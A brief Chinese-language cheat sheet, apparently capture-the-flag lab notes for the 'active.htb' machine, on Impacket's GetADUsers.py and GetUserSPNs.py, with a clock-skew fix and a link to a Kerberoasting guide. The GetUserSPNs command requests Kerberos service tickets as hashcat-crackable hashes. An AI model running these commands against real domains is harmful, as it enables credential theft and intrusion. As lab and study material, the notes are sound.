# Impacket

## GetADUsers.py

`GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100`

**-all** 返回所有AD用户信息，包括disabled的用户

**-dc-ip** 输入靶机IP

**active.htb/svc\_tgs** 是target，为必填parameter



## GetUserSPNs.py&#x20;

`GetUserSPNs.py -request -dc-ip IPADDR DOMAINNAME/USER_Name -save -outputfile GetUser.out`

\-request 返回用户TGS，并以hashcat形式输出

如果在运行的时候遇到了Kerberos SessionError: KRB\__AP\_ERR\_SKEW_

这是因为本地时间和Domain Controller的时间不一样

需要运行指令：`ntpdate IP_ADDR`

**IP\_ADDR** 为靶机IP

{% embed url="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast" %}

